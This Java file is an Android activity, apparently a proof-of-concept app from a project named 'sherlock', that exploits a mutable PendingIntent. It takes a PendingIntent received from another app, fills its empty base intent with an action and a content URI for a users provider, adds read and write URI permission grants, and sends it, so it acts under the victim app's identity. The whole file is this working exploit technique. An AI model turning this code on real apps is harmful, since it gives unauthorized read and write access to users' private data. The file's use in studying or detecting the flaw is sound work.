package sherlock.poc.mutable_pending_intent;

import android.app.PendingIntent;
import android.content.ClipData;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

public class HijackEmptyBaseIntentActivity extends AppCompatActivity {

    private static final String UNSAFE = "unsafe";
    private static final int REQUEST_CODE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        PendingIntent pi = getIntent().getParcelableExtra(UNSAFE);

        Intent hijackIntent = new Intent();
        hijackIntent.setAction("sherlock.poc.TARGET_ACTIVITY");
        hijackIntent.setClipData(ClipData.newRawUri(null, Uri.parse("content://sherlock.test.users_provider/users")));
        hijackIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        if (pi != null) {
            try {
                pi.send(this, REQUEST_CODE, hijackIntent, null, null);
            } catch (PendingIntent.CanceledException e) {
                Log.e("FAILED", "Failed to send pending intent: " + e);
            }
        }
    }
}
